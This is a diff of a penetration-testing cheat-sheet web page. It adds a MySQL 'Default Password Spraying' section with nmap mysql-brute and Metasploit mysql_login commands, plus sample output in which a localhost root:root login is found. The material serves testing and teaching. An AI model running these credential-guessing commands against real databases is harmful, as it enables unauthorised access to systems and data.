@@ -165,7 +165,70 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-  <h3 id="connect-to-mysql-database">Connect to MySQL Database</h3>
+  <h3 id="default-password-spraying">Default Password Spraying</h3>
+<p class="tabs">
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Nmap</button>
+
+<button data-tabset="set1" data-tabcontent="tab2">Metasploit</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo nmap -p3306 --script=mysql-brute <span class="o editable-keyword">&lt;TARGET&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -p3306 --script<span class="o">=</span>mysql-brute 127.0.0.1
+</span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for localhost (127.0.0.1)
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.000078s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT     STATE SERVICE
+</span></span></span><span class="line"><span class="cl"><span class="go">3306/tcp open  mysql
+</span></span></span><span class="line"><span class="cl"><span class="go">| mysql-brute: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   Accounts: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     root:root - Valid credentials
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  Statistics: Performed 45009 guesses in 6 seconds, average tps: 7501.5
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use auxiliary/scanner/mysql/mysql_login
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">msf auxiliary(scanner/mysql/mysql_login) &gt; options
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Module options (auxiliary/scanner/mysql/mysql_login):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   Name              Current Setting                                            Required  Description
+</span></span></span><span class="line"><span class="cl"><span class="go">   ----              ---------------                                            --------  -----------
+</span></span></span><span class="line"><span class="cl"><span class="go">   ANONYMOUS_LOGIN   false                                                      yes       Attempt to login with a blank username and password
+</span></span></span><span class="line"><span class="cl"><span class="go">   BLANK_PASSWORDS   true                                                       no        Try blank passwords for all users
+</span></span></span><span class="line"><span class="cl"><span class="go">   BRUTEFORCE_SPEED  5                                                          yes       How fast to bruteforce, from 0 to 5
+</span></span></span><span class="line"><span class="cl"><span class="go">   CreateSession     false                                                      no        Create a new session for every successful login
+</span></span></span><span class="line"><span class="cl"><span class="go">   DB_ALL_CREDS      false                                                      no        Try each user/password couple stored in the current database
+</span></span></span><span class="line"><span class="cl"><span class="go">   DB_ALL_PASS       false                                                      no        Add all passwords in the current database to the list
+</span></span></span><span class="line"><span class="cl"><span class="go">   DB_ALL_USERS      false                                                      no        Add all users in the current database to the list
+</span></span></span><span class="line"><span class="cl"><span class="go">   DB_SKIP_EXISTING  none                                                       no        Skip existing credentials stored in the current database (Accepted: none, user, user&amp;realm)
+</span></span></span><span class="line"><span class="cl"><span class="go">   PASSWORD                                                                     no        A specific password to authenticate with
+</span></span></span><span class="line"><span class="cl"><span class="go">   PASS_FILE                                                                    no        File containing passwords, one per line
+</span></span></span><span class="line"><span class="cl"><span class="go">   Proxies                                                                      no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, socks5
+</span></span></span><span class="line"><span class="cl"><span class="go">   RHOSTS            127.0.0.1                                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span></span><span class="line"><span class="cl"><span class="go">   RPORT             3306                                                       yes       The target port (TCP)
+</span></span></span><span class="line"><span class="cl"><span class="go">   STOP_ON_SUCCESS   true                                                       yes       Stop guessing when a credential works for a host
+</span></span></span><span class="line"><span class="cl"><span class="go">   THREADS           1                                                          yes       The number of concurrent threads (max one per host)
+</span></span></span><span class="line"><span class="cl"><span class="go">   USERNAME          root                                                       no        A specific username to authenticate as
+</span></span></span><span class="line"><span class="cl"><span class="go">   USERPASS_FILE                                                                no        File containing users and passwords separated by space, one pair per line
+</span></span></span><span class="line"><span class="cl"><span class="go">   USER_AS_PASS      true                                                       no        Try the username as the password for all users
+</span></span></span><span class="line"><span class="cl"><span class="go">   USER_FILE         /usr/share/seclists/Usernames/top-usernames-shortlist.txt  no        File containing usernames, one per line
+</span></span></span><span class="line"><span class="cl"><span class="go">   VERBOSE           true                                                       yes       Whether to print output for all attempts
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">View the full module info with the info, or info -d command.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">msf auxiliary(scanner/mysql/mysql_login) &gt; run
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] 127.0.0.1:3306        - 127.0.0.1:3306 - Found remote MySQL version 11.8.3
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] 127.0.0.1:3306        - No active DB -- Credential data will not be saved!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] 127.0.0.1:3306        - 127.0.0.1:3306 - Success: 'root:root'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 127.0.0.1:3306        - Scanned 1 of 1 hosts (100% complete)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 127.0.0.1:3306        - Bruteforce completed, 1 credential was successful.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 127.0.0.1:3306        - You can open an MySQL session with these credentials and CreateSession set to true
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Auxiliary module execution completed
+</span></span></span></div></pre></div></div></div>
+
+<p></p>
+<h3 id="connect-to-mysql-database">Connect to MySQL Database</h3>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mysql -u <span class="o editable-keyword">&lt;USER&gt;</span> -h <span class="o editable-keyword">&lt;TARGET&gt;</span> -p'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Database known
